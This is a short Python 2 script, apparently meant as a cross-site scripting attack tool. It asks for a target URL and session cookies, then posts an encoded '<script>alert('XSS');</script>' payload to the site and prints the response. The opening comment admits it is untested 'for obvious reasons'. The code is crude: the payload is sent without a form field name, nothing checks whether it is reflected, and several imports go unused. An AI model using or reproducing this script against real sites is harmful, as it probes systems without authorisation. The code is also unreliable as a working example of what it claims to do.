# code works in theory, not properly tested for obvious reasons.

import os
import sys
import socket
import time
import urllib
import urllib2

from bs4 import BeautifulSoup

# Get the target URL from the user
url = raw_input("Enter the URL of the target site: ")

# Get the cookies from the user
cookies = raw_input("Enter the cookies for the target site: ")

# Construct the payload
payload = "<script>alert('XSS');</script>"

# Encode the payload
payload = urllib.quote_plus(payload)

# Construct the HTTP request
request = urllib2.Request(url)

# Add the necessary headers
request.add_header("Cookie", cookies)
request.add_header("Content-Type", "application/x-www-form-urlencoded")

# Send the request
response = urllib2.urlopen(request, payload)

# Get the response HTML
html = response.read()

# Parse the response HTML
soup = BeautifulSoup(html)

# Print the parsed HTML
print(soup.prettify())
